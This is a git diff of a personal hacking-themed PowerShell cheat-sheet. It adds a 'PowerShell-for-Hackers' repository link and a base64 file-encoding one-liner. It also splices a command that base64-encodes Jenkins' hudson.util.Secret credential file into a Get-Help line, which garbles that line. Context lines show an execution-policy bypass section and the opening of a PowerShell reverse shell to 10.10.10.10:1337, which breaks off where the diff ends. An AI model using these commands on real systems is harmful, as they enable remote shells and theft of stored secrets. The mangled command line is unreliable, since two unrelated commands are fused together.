@@ -1,4 +1,5 @@
 # Useful Powershell
+
 This is a condensed and *Hacking themed* resource for powershell. Powershell is a massive and my humble opinion a *weird* object-oriented programming language.  Windows and Powershell are not case-sensitive, but a *stardard* readability is to use upper-case first letter - I suggest not unless you need to present your work(use a script to change it to *standard*). Every command has a cmdlet and combinations of `verb-noun` to construct command that would be too numerous to list. So to define the theme of this document is oneliners catergorised by use(*just in case at some point they maybe some exceptions like two oneliners that need to be seperate executions* **THESE WILL HAVE A `# TASKNAME Command # THEN Command`**. I am in the process of making this better for my own use:
 1. Adding aliases that I might want to use instead of full command
 2. Making the comments defining explaining a better layout
@@ -24,6 +25,11 @@ App | Location
 [Powershelladmin](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations.php)
 
 For all the [[Powershell-Verbs]].
+
+## Community Repositories
+
+I-Am-Jackoby's - https://github.com/I-Am-Jakoby/PowerShell-for-Hackers
+
 
 ## Execution policy bypass And Versioning 
 ```powershell
@@ -58,7 +64,7 @@ while(1) { cat index.html | nc -w1 -l -p 8080 }
 Get-Command              # list of powershell commands, BEWARE OF THE LISTS
 Get-Verb				 # list all verbs
 Get-Help                 # help for specific cmdlet
-Get-Help $Command-Name
+Get-Help $Command-Namepowershell -c [convert]::ToBase64String((cat ..\..\secrets\hudson.util.Secret -Encoding byte)) 
 Get-Command Verb-* 
 Get-Command *-Noun # Commands and Cmdlets are both executables in ps, Command= compiled, can be solo-executed cmdlets
 Get-Command | Get-Member -MemberType Method # view members for a the get command
@@ -283,6 +289,10 @@ Get-NetDomainTrust
 Get-ChildItem -Path cert:\LocalMachine
 ```
 
+## Encoding
+```powershell
+powershell -c [convert]::ToBase64String((cat $file -Encoding byte)) 
+```
 ## Powershell Reverse Shell
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1337);
